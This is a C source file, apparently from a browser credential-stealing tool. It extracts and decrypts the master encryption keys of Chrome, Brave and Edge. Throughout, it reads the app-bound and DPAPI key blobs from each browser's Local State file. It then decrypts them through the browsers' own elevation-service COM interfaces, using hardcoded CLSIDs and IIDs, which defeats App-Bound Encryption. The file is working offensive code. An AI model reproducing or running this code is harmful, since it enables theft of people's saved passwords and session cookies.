#include "KeyExtract.h"
#include "ElevatorCom.h"

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// Key blob prefix sizes

#define CRYPT_APPBOUND_KEY_PREFIX_LEN   4
#define CRYPT_DPAPI_KEY_PREFIX_LEN      5

#define V20_DECRYPTED_KEY_SIZE          32

static BOOL LocalStartsWithA(IN LPCSTR pszData, IN DWORD dwDataLen, IN LPCSTR pszPrefix, IN DWORD dwPrefixLen)
{
    if (dwDataLen < dwPrefixLen)
        return FALSE;

    for (DWORD i = 0; i < dwPrefixLen; i++)
    {
        if (pszData[i] != pszPrefix[i])
            return FALSE;
    }

    return TRUE;
}

// Reads Local State and returns the base64-decoded key blob of the given
// JSON child key ("encrypted_key" / "app_bound_encrypted_key") with its
// prefix still attached. Heap buffer, caller frees with HeapFree.
static PBYTE ExtractKeyBlobFromLocalState(IN BROWSER_TYPE Browser, IN LPCSTR pszChildKey, IN LPCSTR pszExpectedPrefix, OUT PDWORD pcbBlob)
{
    CHAR    szRelPath[MAX_PATH] = { 0 };
    CHAR    szFullPath[MAX_PATH] = { 0 };
    PBYTE   pbFileContent       = NULL;
    PBYTE   pbDecodedKey        = NULL;
    LPSTR   pszBase64Key        = NULL;
    DWORD   dwFileSize          = 0x00,
            dwBase64KeyLen      = 0x00,
            dwDecodedKeyLen     = 0x00;
    BOOL    bResult             = FALSE;
    const CHAR  szParentKey[]   = "os_crypt";

    if (!pcbBlob)
        return NULL;

    *pcbBlob = 0;

    if (!GetChromiumBrowserFilePath(Browser, FILE_TYPE_LOCAL_STATE, NULL, szRelPath, MAX_PATH))
        return NULL;

    if (!BuildBrowserDataFilePath(Browser, szRelPath, szFullPath, MAX_PATH))
        return NULL;

    if (!ReadFileFromDiskA(szFullPath, &pbFileContent, &dwFileSize))
        goto _END_OF_FUNC;

    pszBase64Key = FindNestedJsonValue((LPCSTR)pbFileContent, dwFileSize, szParentKey, pszChildKey, &dwBase64KeyLen);
    if (!pszBase64Key || dwBase64KeyLen == 0)
    {
        printf("[!] FindNestedJsonValue Failed To Get %s:%s\n", szParentKey, pszChildKey);
        goto _END_OF_FUNC;
    }

    printf("[v] Found %s::%s:%s\n", szFullPath, szParentKey, pszChildKey);

    if (!(pbDecodedKey = Base64Decode(pszBase64Key, dwBase64KeyLen, &dwDecodedKeyLen)))
        goto _END_OF_FUNC;

    if (!LocalStartsWithA((LPCSTR)pbDecodedKey, dwDecodedKeyLen, pszExpectedPrefix, (DWORD)lstrlenA(pszExpectedPrefix)))
    {
        printf("[!] Decoded Key Is Invalid!\n");
        goto _END_OF_FUNC;
    }

    *pcbBlob = dwDecodedKeyLen;
    bResult  = TRUE;

_END_OF_FUNC:

    HEAP_FREE(pbFileContent);

    if (bResult)
        return pbDecodedKey;

    HEAP_FREE(pbDecodedKey);
    return NULL;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// Elevator CLSIDs & IIDs (filled on the stack - no global GUID variables)
//
// Chrome: https://chromium.googlesource.com/chromium/src/third_party/+/refs/heads/main/win_build_output/midl/chrome/elevation_service/
// Brave & Edge: https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption/blob/master/src/payload/browser_config.hpp

static BOOL GetElevatorGuids(IN BROWSER_TYPE Browser, OUT CLSID* pClsid, OUT IID* pIid)
{
    if (Browser == BROWSER_CHROME)
    {
        *pClsid = { 0x708860E0, 0xF641, 0x4611, { 0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B } };
        *pIid   = { 0x1BF5208B, 0x295F, 0x4992, { 0xB5, 0xF4, 0x3A, 0x9B, 0xB6, 0x49, 0x48, 0x38 } }; // V2
        return TRUE;
    }
    else if (Browser == BROWSER_BRAVE)
    {
        *pClsid = { 0x576B31AF, 0x6369, 0x4B6B, { 0x85, 0x60, 0xE4, 0xB2, 0x03, 0xA9, 0x7A, 0x8B } };
        *pIid   = { 0xF396861E, 0x0C8E, 0x4C71, { 0x82, 0x56, 0x2F, 0xAE, 0x6D, 0x75, 0x9C, 0xE9 } };
        return TRUE;
    }
    else if (Browser == BROWSER_EDGE)
    {
        *pClsid = { 0x1FCBE96C, 0x1697, 0x43AF, { 0x91, 0x40, 0x28, 0x97, 0xC7, 0xC6, 0x97, 0x67 } };
        *pIid   = { 0xC9C2B807, 0x7731, 0x4F34, { 0x81, 0xB7, 0x44, 0xFF, 0x77, 0x79, 0x52, 0x2B } };
        return TRUE;
    }

    return FALSE;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// V20 (App-Bound) key

BOOL ExtractDecryptedV20KeyFromLocalState(IN BROWSER_TYPE Browser, OUT PBYTE* ppbKey, OUT PDWORD pcbKey)
{
    IElevator*      pElevator           = NULL;
    IElevatorEdge*  pElevatorEdge       = NULL;
    PBYTE           pbKeyBlob           = NULL;
    PBYTE           pbEncryptedKey      = NULL;
    DWORD           dwKeyBlobSize       = 0x00,
                    dwEncryptedKeySize  = 0x00,
                    dwLastError         = ERROR_GEN_FAILURE;
    BSTR            bstrCiphertext      = NULL,
                    bstrPlaintext       = NULL;
    HRESULT         hResult             = S_OK;
    BOOL            bResult             = FALSE;
    CLSID           clsidElevator       = { 0 };
    IID             iidElevator         = { 0 };
    IID             iidChromeV1         = { 0x463ABECF, 0x410D, 0x407F, { 0x8A, 0xF5, 0x0D, 0xF3, 0x5A, 0x00, 0x5C, 0xC8 } };
    const CHAR      szChildKey[]        = "app_bound_encrypted_key";
    const CHAR      szKeyPrefix[]       = "APPB";
    LPSTR           pszBrowserName      = NULL;

    if (!ppbKey || !pcbKey)
        return FALSE;

    *ppbKey = NULL;
    *pcbKey = 0;

    pszBrowserName = GetBrowserName(Browser);

    if (!GetElevatorGuids(Browser, &clsidElevator, &iidElevator))
    {
        if (pszBrowserName)
            printf("[!] Browser '%s' Has No App-Bound Elevation Service\n", pszBrowserName);
        goto _END_OF_FUNC;
    }

    if (FAILED((hResult = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED))))
    {
        printf("[!] CoInitializeEx Failed With Error: 0x%08X\n", (unsigned int)hResult);
        goto _END_OF_FUNC;
    }

    // Create the appropriate COM instance based on browser type
    if (Browser == BROWSER_EDGE)
    {
        if (FAILED((hResult = CoCreateInstance(clsidElevator, NULL, CLSCTX_LOCAL_SERVER, iidElevator, (LPVOID*)&pElevatorEdge))))
        {
            printf("[!] CoCreateInstance Failed With Error: 0x%08X\n", (unsigned int)hResult);
            goto _END_OF_FUNC;
        }

        hResult = CoSetProxyBlanket(
            (IUnknown*)pElevatorEdge,
            RPC_C_AUTHN_DEFAULT,
            RPC_C_AUTHZ_DEFAULT,
            COLE_DEFAULT_PRINCIPAL,
            RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
            RPC_C_IMP_LEVEL_IMPERSONATE,
            NULL,
            EOAC_DYNAMIC_CLOAKING
        );
    }
    // Chrome or Brave
    else
    {
        if (FAILED((hResult = CoCreateInstance(clsidElevator, NULL, CLSCTX_LOCAL_SERVER, iidElevator, (LPVOID*)&pElevator))))
        {
            if (hResult == E_NOINTERFACE && Browser == BROWSER_CHROME)
            {
                // Fallback To IID V1 If Chrome
                printf("[i] Falling Back To Chrome's V1 IID ...\n");
                iidElevator = iidChromeV1;

                if (FAILED((hResult = CoCreateInstance(clsidElevator, NULL, CLSCTX_LOCAL_SERVER, iidElevator, (LPVOID*)&pElevator))))
                {
                    printf("[!] CoCreateInstance Failed With Error: 0x%08X\n", (unsigned int)hResult);
                    goto _END_OF_FUNC;
                }
            }
            else
            {
                printf("[!] CoCreateInstance Failed With Error: 0x%08X\n", (unsigned int)hResult);
                goto _END_OF_FUNC;
            }
        }

        hResult = CoSetProxyBlanket(
            (IUnknown*)pElevator,
            RPC_C_AUTHN_DEFAULT,
            RPC_C_AUTHZ_DEFAULT,
            COLE_DEFAULT_PRINCIPAL,
            RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
            RPC_C_IMP_LEVEL_IMPERSONATE,
            NULL,
            EOAC_DYNAMIC_CLOAKING
        );
    }

    if (FAILED(hResult))
    {
        printf("[!] CoSetProxyBlanket Failed With Error: 0x%08X\n", (unsigned int)hResult);
        goto _END_OF_FUNC;
    }

    // Read the "APPB"-prefixed key blob from Local State
    if (!(pbKeyBlob = ExtractKeyBlobFromLocalState(Browser, szChildKey, szKeyPrefix, &dwKeyBlobSize)))
        goto _END_OF_FUNC;

    dwEncryptedKeySize = dwKeyBlobSize - CRYPT_APPBOUND_KEY_PREFIX_LEN;

    if (!(pbEncryptedKey = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwEncryptedKeySize)))
    {
        printf("[!] HeapAlloc Failed With Error: %lu\n", GetLastError());
        goto _END_OF_FUNC;
    }

    memcpy(pbEncryptedKey, pbKeyBlob + CRYPT_APPBOUND_KEY_PREFIX_LEN, dwEncryptedKeySize);

    if (!(bstrCiphertext = SysAllocStringByteLen((LPCSTR)pbEncryptedKey, dwEncryptedKeySize)))
        goto _END_OF_FUNC;

    // Call DecryptData using the appropriate interface
    if (Browser == BROWSER_EDGE)
    {
        if (FAILED((hResult = pElevatorEdge->lpVtbl->DecryptData(pElevatorEdge, bstrCiphertext, &bstrPlaintext, &dwLastError))))
        {
            printf("[!] IElevatorEdge::DecryptData Failed With Error: 0x%08X (LastError: %lu)\n", (unsigned int)hResult, dwLastError);
            goto _END_OF_FUNC;
        }
    }
    // Chrome or Brave
    else
    {
        if (FAILED((hResult = pElevator->lpVtbl->DecryptData(pElevator, bstrCiphertext, &bstrPlaintext, &dwLastError))))
        {
            printf("[!] IElevator::DecryptData Failed With Error: 0x%08X (LastError: %lu)\n", (unsigned int)hResult, dwLastError);
            goto _END_OF_FUNC;
        }
    }

    if (pszBrowserName)
        printf("[*] Function 'DecryptData' Succeeded For: %s!\n", pszBrowserName);

    if (SysStringByteLen(bstrPlaintext) < V20_DECRYPTED_KEY_SIZE)
    {
        printf("[!] IElevator::DecryptData Returned An Unexpected Key Size\n");
        goto _END_OF_FUNC;
    }

    if (!(*ppbKey = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, V20_DECRYPTED_KEY_SIZE)))
    {
        printf("[!] HeapAlloc Failed With Error: %lu\n", GetLastError());
        goto _END_OF_FUNC;
    }

    memcpy(*ppbKey, (PVOID)bstrPlaintext, V20_DECRYPTED_KEY_SIZE);
    *pcbKey = V20_DECRYPTED_KEY_SIZE;

    bResult = TRUE;

_END_OF_FUNC:

    if (!bResult)
        HEAP_FREE_SECURE(*ppbKey, V20_DECRYPTED_KEY_SIZE);

    HEAP_FREE_SECURE(pbEncryptedKey, dwEncryptedKeySize);
    HEAP_FREE(pbKeyBlob);
    HEAP_FREE(pszBrowserName);

    if (bstrPlaintext)
        SysFreeString(bstrPlaintext);
    if (bstrCiphertext)
        SysFreeString(bstrCiphertext);

    if (pElevator)
        pElevator->lpVtbl->Release(pElevator);
    if (pElevatorEdge)
        pElevatorEdge->lpVtbl->Release(pElevatorEdge);

    CoUninitialize();

    return bResult;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// V10 (DPAPI) key

BOOL ExtractDecryptedV10KeyFromLocalState(IN BROWSER_TYPE Browser, OUT PBYTE* ppbKey, OUT PDWORD pcbKey)
{
    PBYTE   pbKeyBlob       = NULL;
    PBYTE   pbDecryptedKey  = NULL;
    DWORD   dwKeyBlobSize   = 0x00,
            dwDecryptedLen  = 0x00;
    BOOL    bResult         = FALSE;
    const CHAR  szChildKey[]    = "encrypted_key";
    const CHAR  szKeyPrefix[]   = "DPAPI";

    if (!ppbKey || !pcbKey)
        return FALSE;

    *ppbKey = NULL;
    *pcbKey = 0;

    // Read the "DPAPI"-prefixed key blob from Local State
    if (!(pbKeyBlob = ExtractKeyBlobFromLocalState(Browser, szChildKey, szKeyPrefix, &dwKeyBlobSize)))
        return FALSE;

    // Decrypt with DPAPI (skip the "DPAPI" prefix)
    if (!DecryptDpapiBlob(pbKeyBlob + CRYPT_DPAPI_KEY_PREFIX_LEN, dwKeyBlobSize - CRYPT_DPAPI_KEY_PREFIX_LEN, &pbDecryptedKey, &dwDecryptedLen))
        goto _END_OF_FUNC;

    if (!(*ppbKey = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwDecryptedLen)))
    {
        printf("[!] HeapAlloc Failed With Error: %lu\n", GetLastError());
        goto _END_OF_FUNC;
    }

    memcpy(*ppbKey, pbDecryptedKey, dwDecryptedLen);
    *pcbKey = dwDecryptedLen;

    bResult = TRUE;

_END_OF_FUNC:

    if (pbDecryptedKey)
        LocalFree(pbDecryptedKey);

    HEAP_FREE(pbKeyBlob);

    return bResult;
}
